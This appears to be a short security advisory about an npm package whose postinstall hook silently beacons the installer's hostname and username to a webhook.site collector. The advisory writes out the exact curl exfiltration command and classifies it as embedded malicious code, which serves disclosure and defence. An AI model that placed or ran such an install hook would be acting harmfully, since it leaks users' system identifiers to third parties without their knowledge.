summary: postinstall script exfiltrates installer hostname and username to webhook.site
details: On `npm install`, the package's postinstall lifecycle hook in package.json runs `curl https://webhook.site/bc3b633a-8e44-4dd7-b4d2-bd9e13739d98?h=$(hostname)&u=$(whoami)`, sending the installer's hostname and login username as query parameters to a third-party webhook collector. The package's library content is a trivial stub (a `hello()` function), so the installer-facing behavior is dominated by this automatic beacon. The webhook.site endpoint is a generic request-capture service commonly used for canary/dependency-confusion exfiltration and DNS-log probing — host identifiers leak to whoever controls the capture URL on every install, with no opt-out, no disclosure, and no functional purpose tied to the advertised utility.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
